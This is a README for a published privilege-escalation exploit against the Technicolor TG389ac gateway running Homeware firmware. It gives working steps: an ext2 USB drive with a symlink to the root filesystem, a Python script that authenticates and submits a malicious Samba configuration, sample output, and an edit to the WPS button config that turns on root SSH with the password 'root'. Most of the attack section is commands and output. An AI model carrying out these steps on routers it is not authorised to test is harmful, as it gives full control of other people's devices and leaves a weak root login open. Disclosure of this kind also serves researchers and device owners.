# FDEU-CVE-2020-1FC5
Samba privilege escalation exploit. Tested on Technicolor TG389ac from Telia (LT) running Homeware 17.1.7992.
Other Technicolor gateways running Homeware NG firmwares up to 17.x with original webui front-end are possibly affected.

## Requirements

* Local admin access
* Empty USB flash drive with EXT2 partition

## Prepare the flash drive

```
mkfs.ext2 /dev/sdX1
mkdir /tmp/sdX1
mount /dev/sdX1 /tmp/sdX1
cd /tmp/sdX1
touch exploit
ln -s / rootfs
cd ~
umount /tmp/sdX1
```

Plug the fash into the router's USB port.

## Install dependencies

```
apt-get install python3 python3-requests python3-srp
```

## Enable root filesystem access

Run the provided exploit script:

```
# python3 tg389ac_samba_exploit.py http://192.168.1.254 admin
Password: 
[*] Init SRP authentication
[*] Get CSRF token
[*] Send authentication challenge
[*] Send authentication response
[*] Renew CSRF token
[*] Submit dummy samba config
[*] Submit samba exploit
[*] Reboot the router
b'{ "success":"true" }'
[*] Done. Wait until the rooter boots and open the network share
Example: \\192.168.1.254 or smb://192.168.1.254
```

You can now browse the root filesystem via SMB.

## Enable root SSH

Browse the SMB share and edit `/etc/config/button` file this way at 'wps' config section:

https://github.com/full-disclosure/FDEU-CVE-2020-1FC5/blob/master/etc-config-button#L48

Activate WPS button once as normal by pressing it for a couple of seconds (the exact required amount of seconds is shown in that same configuration file).
This will run the above snippet to correctly setup local SSH root access (user: root, password: root) and restore original WPS button configuration.
You can now login as root via ssh into your gateway.

## Docker

```
sudo docker build -t tg389ac_samba_exploit .
sudo docker run -ti tg389ac_samba_exploit /bin/bash
cd FDEU-CVE-2020-1FC5
python3 tg389ac_samba_exploit.py
```
